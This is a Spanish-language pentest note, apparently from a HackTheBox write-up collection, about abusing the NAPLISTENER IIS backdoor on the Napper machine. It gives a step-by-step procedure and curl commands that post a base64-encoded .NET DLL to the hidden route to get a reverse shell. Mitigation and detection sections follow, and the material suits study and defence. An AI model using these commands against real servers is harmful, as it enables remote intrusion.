---
topic: NAPLISTENER — backdoor de IIS que carga assemblies .NET
tags: [windows, iis, naplistener, backdoor, dotnet, napper]
---

# NAPLISTENER — backdoor de IIS que carga assemblies .NET

[🌐 English](naplistener-iis-backdoor.en.md) | **Español**

## Concepto

NAPLISTENER es un backdoor de IIS que se implementa como módulo o handler HTTP y se camufla como una ruta legítima. Recibe un assembly .NET en base64 por un parámetro POST, lo decodifica en memoria y ejecuta un método concreto, normalmente el constructor de una clase `Run`. No necesita escribir un `.aspx` ni un ejecutable en disco.

En Napper la ruta era `/ews/MsExgHealthCheckd/`, el parámetro `sdafwe3rwe23` y la respuesta añadía `Microsoft-HTTPAPI/2.0` al header `Server`.

## Cuándo aplica

- IIS con un módulo nativo o un handler .NET añadido fuera del sitio estándar.
- Ruta que responde 404 en GET y 200 en POST con un parámetro concreto.
- Header `Server` con `Microsoft-HTTPAPI/2.0` en una respuesta que no es la habitual.
- Documentación o código fuente que describe el contrato del backdoor.

## Procedimiento

1. Buscar rutas anómalas en IIS (`/ews/`, nombres largos, health checks).
2. Comparar `Server` y códigos entre GET y POST.
3. Identificar el parámetro y el formato (base64 de un PE .NET).
4. Compilar una DLL con la clase y el constructor esperados.
5. Enviar el base64 URL-encoded y recibir la conexión.

## Comandos

```bash
curl -i http://<HOST>/ews/MsExgHealthCheckd/
curl -i -X POST -d 'sdafwe3rwe23=' http://<HOST>/ews/MsExgHealthCheckd/
```

```bash
mcs -target:library -out:rev.dll rev.cs
base64 -w0 rev.dll > rev.b64
curl -X POST --data-urlencode 'sdafwe3rwe23@rev.b64' \
  http://<HOST>/ews/MsExgHealthCheckd/
```

El assembly debe exponer `namespace rev`, `public class Run` y un constructor `Run()` que abra la reverse shell.

## Variantes

- El parámetro puede llamarse distinto o ir en el body como `application/x-www-form-urlencoded`.
- La clase puede ser `Run`, `Program` o un nombre definido en el malware.
- El assembly puede cargarse con `Assembly.Load` y ejecutarse por reflexión.
- La ruta puede imitar un endpoint de Exchange (`/ews/`, `/autodiscover/`).

## Limitaciones

- Sin el contrato exacto (ruta, parámetro, clase), el payload no se ejecuta.
- El assembly debe ser compatible con la versión de .NET del servidor.
- IIS puede registrar el cuerpo o bloquear peticiones grandes.
- El backdoor puede requerir autenticación o un token.

## Mitigación

- Auditar módulos y handlers de IIS (`appcmd list modules`).
- Comparar la configuración con una línea base y buscar rutas no documentadas.
- Aplicar allowlist de extensiones y módulos; firmar assemblies.
- Monitorizar POST a rutas de health check con base64.
- Reinstalar IIS desde una imagen limpia si se confirma un backdoor.

## Detección

- GET 404 y POST 200 en la misma ruta.
- `Server: Microsoft-HTTPAPI/2.0` en respuestas de un sitio IIS.
- Cuerpos base64 que decodifican a `MZ` (PE).
- `w3wp.exe` cargando assemblies desde memoria o procesos hijos inesperados.

## Referencias

- [Elastic — IIS malware](https://www.elastic.co/security-labs/iis-malware)
- [MITRE — NAPLISTENER](https://attack.mitre.org/software/S1106/)
- [0xdf — Napper](https://0xdf.gitlab.io/2024/05/04/htb-napper.html)
- [Ficha Napper](../../machines/windows/napper/README.md)
